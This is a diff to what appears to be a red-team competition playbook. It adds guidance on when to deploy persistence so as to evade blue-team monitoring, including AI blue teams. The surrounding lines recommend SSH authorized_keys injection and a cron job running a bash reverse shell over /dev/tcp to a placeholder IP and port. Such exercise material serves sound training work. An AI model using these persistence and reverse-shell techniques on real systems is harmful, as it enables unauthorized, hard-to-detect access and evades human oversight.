@@ -290,11 +290,21 @@ Why this technique is uniquely valuable:
   - Human teams cannot detect it in competition timeframes (0/32 in inv2; 0/32 in inv3; 0/45 in inv6)
   - AI blue team risk: HIGH for external domains with fixed intervals; LOW for AD-embedded with jitter
 
+### Persistence Deployment Timing
+
+**Persistence deployment timing:**
+
+Deploy persistence immediately (within 90 seconds of access) during the opening window (T+0 to T+5 minutes from competition start). Speed is the priority in this window — a persistence mechanism deployed in 90 seconds and later detected is better than a perfect mechanism deployed 10 minutes too late.
+
+After T+5 minutes, if access is already established and you are in a consolidation phase, consider a brief staging delay (5-10 minutes) before deploying additional mechanisms on newly-accessed hosts. Blue team monitoring intensity peaks immediately after compromise indicators trigger — a short pause lets automated detection cycles complete before you deploy the next layer. This applies to SECONDARY and TERTIARY mechanisms, not to the initial persistence deployment.
+
+Exception: never delay past the blue team's estimated remediation window. If you don't know the team's remediation speed, deploy immediately and plan for multi-layer redundancy instead of relying on timing evasion.
+
 ### Preferred Linux Persistence Alternatives (AI Blue Team Resilient)
 
 Use these techniques instead of HTTP-based implant delivery:
 
-1. **SSH authorized_keys injection** (HIGHEST PRIORITY): Survives password changes, generates minimal logs, uses encrypted protocol. Deploy on every Linux target immediately upon access. See SSH Key Deployment section below.
+1. **SSH authorized_keys injection** (HIGHEST PRIORITY): Survives password changes, generates minimal logs, uses encrypted protocol. Deploy on every Linux target upon access (see Persistence Deployment Timing above for phase-dependent urgency). See SSH Key Deployment section below.
 
 2. **Cron with existing system binaries**: Instead of downloading an external binary, use bash built-ins and existing system tools. A cron job that runs `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` uses no external binary and generates only a cron execution log entry.
 
